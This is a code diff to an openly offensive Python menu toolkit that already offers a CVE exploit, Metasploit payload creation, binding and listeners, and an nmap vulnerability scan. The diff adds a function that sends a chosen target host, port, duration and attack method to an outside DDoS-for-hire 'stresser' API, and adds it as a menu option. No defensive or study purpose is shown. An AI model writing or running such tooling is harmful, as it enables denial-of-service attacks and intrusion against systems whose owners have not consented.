@@ -1,10 +1,12 @@
 import getpass
 import os
 import subprocess
+import requests
 
 from pymenu import Menu
 from pymetasploit3.msfrpc import MsfRpcClient
 
+nightmarekey = ''
 
 def CVE20262461():
     selector = input('[+] Single or multiple: ')
@@ -64,8 +66,21 @@ def windowslistener():
 
 def vulnscanmodule():
     target = input('[+] Target URL/IP Address: ')
-    subprocess.run(f'''nmap --script vuln {target}''', shell=True)
+    subprocess.run(f'''nmap --script vuln --script-args mincvss+5.0 {target}''', shell=True)
     print('\n[+] Happy hunting ;)')
+
+def nightmare():
+    target = input('[+] Target URL/IP Address: ')
+    port = input('[+] Target Port: ')
+    time = input('[+] How many seconds do you want to run?: ')
+    method = input('[+] Which method do you want to run?: ')
+    url2 = f'https://api.nightmare-stresser.com/?key={nightmarekey}&method={method}&host={target}&port={port}&time={time}'
+    response = requests.get(url=url2)
+    data = response.json()
+    if not data['success']:
+        print('[+] Error: ' + data['message'])
+    else:
+        print('[+] Success: ' + data['message'])
 
 menu = Menu('''
 
@@ -81,4 +96,5 @@ menu.add_option('[+] Create windows payload (MSFVenom)', lambda: windowspayload(
 menu.add_option('[+] Bind windows payload (MSFVenom)', lambda: windowspayloadbind())
 menu.add_option('[+] Listen for windows payload (MSFConsole)', lambda: windowslistener())
 menu.add_option('[+] CVE scanner (NMAP)', lambda: vulnscanmodule())
+menu.add_option('[+] Nightmare stresser (Requires API key)', lambda: nightmare())
 menu.show()
